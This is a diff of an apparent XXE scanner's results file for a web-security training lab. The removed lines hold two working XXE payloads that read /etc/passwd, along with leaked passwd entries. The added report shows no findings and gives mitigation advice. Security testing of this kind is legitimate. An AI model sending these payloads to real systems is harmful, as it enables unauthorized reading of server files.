@@ -1,27 +1,33 @@
-XXE SCAN RESULTS - https://0a63003f0487332c80f0806900f600f6.web-security-academy.net/
-============================================================
-
-TYPE: XXE (Classic In-Band)
-CONFIDENCE: high
-ENDPOINT: https://0a63003f0487332c80f0806900f600f6.web-security-academy.net/product/stock
-FILE READ: file:///etc/passwd
-EVIDENCE: "Invalid product ID: root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/no
-PAYLOAD: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><productId>&xxe;</productId><storeId>1</storeId></root>
-xxe_detected=true
-
-────────────────────────────────────────
-
-TYPE: XXE (Content-Type Switch)
-CONFIDENCE: high
-ENDPOINT: https://0a63003f0487332c80f0806900f600f6.web-security-academy.net/product/stock
-FILE READ: file:///etc/passwd
-EVIDENCE: "Invalid product ID: root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/no
-PAYLOAD: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
-xxe_detected=true
-
-────────────────────────────────────────
-
+═══════════════════════════════════════════════════════
+  XXE VULNERABILITY SCAN REPORT
+═══════════════════════════════════════════════════════
+[TARGET]    
+[MODE]      full
+[DATE]      2026-05-28 19:21:53
+[DURATION]  0s
+───────────────────────────────────────────────────────
+  DETECTION RESULTS
+───────────────────────────────────────────────────────
+[✗] XML Parser Detected            → Not Confirmed
+[✗] External Entities Enabled      → Closed
+[✗] OOB Callback Received          → No external connection
+[✗] Direct Data Extraction         → Does not display data directly
+[✗] Parameter Entities Allowed     → Unsupported
+───────────────────────────────────────────────────────
+  VULNERABILITIES FOUND
+───────────────────────────────────────────────────────
+[INFO] No exploitable vulnerabilities confidently confirmed.
+───────────────────────────────────────────────────────
+  EXTRACTED FILES
+───────────────────────────────────────────────────────
+[1] Unknown (based on filename: results.txt) → saved to /mnt/c/Users/awad/Downloads/SMART-HUNTER-main/SMART-HUNTER-main/Data/xxe_scan_results/results.txt
+───────────────────────────────────────────────────────
+  RECOMMENDATIONS
+───────────────────────────────────────────────────────
+• Disable DTD processing in XML parser
+• Set XMLInputFactory.SUPPORT_DTD = false
+• Use defusedxml (Python) or similar safe parsers
+• Block outbound connections from application server
+═══════════════════════════════════════════════════════
+  SEVERITY: INFO | Vulnerabilities: 0 | Files: 1
+═══════════════════════════════════════════════════════
